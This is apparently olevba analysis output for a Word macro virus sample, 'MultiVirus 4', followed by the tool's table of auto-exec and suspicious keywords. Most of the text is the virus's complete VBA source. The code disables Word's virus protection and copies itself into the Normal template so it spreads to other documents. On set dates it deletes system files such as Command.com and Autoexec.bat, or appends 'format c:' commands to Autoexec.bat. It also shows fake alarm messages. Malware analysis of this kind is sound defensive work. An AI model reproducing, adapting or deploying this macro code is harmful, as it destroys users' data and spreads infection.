olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.MultiVirus.4-7984f2228f39c36eea4897af6d346ca59eaffd66
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.MultiVirus.4-7984f2228f39c36eea4897af6d346ca59eaffd66 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MultiVirus4.bas 
in file: Virus.MSWord.MultiVirus.4-7984f2228f39c36eea4897af6d346ca59eaffd66 - OLE stream: 'Macros/VBA/MultiVirus4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
' Macro Virus Epidemic
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyDate
MyDate = Date
D$ = Mid(MyDate, 1, 5)
If D$ = "10/10" Then
    Kill "C:\Command.com"
    Kill "C:\Autoexec.bat"
    Kill "C:\Config.sys"
    MsgBox "Epidemic Macro Virus V1.2", Title:="Virus MultiVirus 4"
End If
If D$ = "27/04" Then
    Open "C:\Autoexec.bat" For Append As #1
        Print #1, "PATH=%PATH%;C:\DOS;C:\WINDOWS\COMMAND"
        Print #1, "echo o|format c: /u /V:EPIDEMIC >nul"
        Print #1, "echo y|format c: /u /V:EPIDEMIC >nul"
    Close #1
End If
ErrorAE:
End Sub
Sub AutoClose()
' Macro Virus Divina
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAC
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "MultiVirus4" Then
        MultiVirus4Installed = -1
    End If
Next i
If Not MultiVirus4Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus4", Object:=wdOrganizerObjectProjectItems
Else
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus4", Object:=wdOrganizerObjectProjectItems
End If
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
D$ = Mid(MyDate, 1, 5)
T$ = Mid(MyTime, 4, 5)
If T$ = "17" Then
    MsgBox "Disque Dur endommagй. Dйmarrer l'antivirus ?" & Chr$(13) & "Virus 'MultiVirus 4' est lancй", vbInformation, Title:="Microsoft Word"
    MsgBox "Sortez de votre systиme et lancer un formatage de bas niveau" & Chr$(13) & "Virus stoppй", vbInformation, Title:="Microsoft Word"
    MsgBox "Sortir du systиme ?" & Chr$(13) & "Microsoft Windows", vbInformation, "Microsoft Word"
End If
If D$ = "21/05" Then
    Select Case T$
        Case "11" To "19", "17", "41" To "49"
            MsgBox "DIVINA IS THE BEST!!!" & Chr$(13) & "zio Massimo", Title:="Virus MultiVirus 4"
            MsgBox "Aujourd'hui, c'est l'anniversaire de Divina: On doit faire la fкte!" & Chr$(13) & "Ne continuer pas ou je devrais formater le disque dur..." & Chr$(13) & "Virus 'DIVINA' est exйcutй", Title:="Virus MultiVirus 4"
    End Select
End If
ErrorAC:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "MultiVirus4" Then
        MultiVirus4Installed = -1
    End If
Next i
If Not MultiVirus4Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus4", Object:=wdOrganizerObjectProjectItems
    ' Macro Virus Dodger
    Beep
    MsgBox "*** tHe aRtFuL dOdGeR ***", Title:="Virus MultiVirus 4"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatTemplate Or ActiveDocument.SaveFormat = wdFormatDocument Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus4", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFSA:
End Sub
Sub FileTemplates()
' Macro Virus Master
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "© 1998 Master of infection", Title:="Virus MultiVirus 4"
ErrorFT:
End Sub
Sub ToolsMacro()
' Macro Virus Master
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "© 1998 Master of infection", Title:="Virus MultiVirus 4"
ErrorTM:
End Sub
Sub ToolsOptions()
'Macro Virus Master
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTO
    MsgBox "© 1998 Master of infection", Title:="Virus MultiVirus 4"
ErrorTO:
End Sub
Sub ViewVBCode()
' Macro Virus Master
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "© 1998 Master of infection", Title:="Virus MultiVirus 4"
ErrorVVBC:
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|doit                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

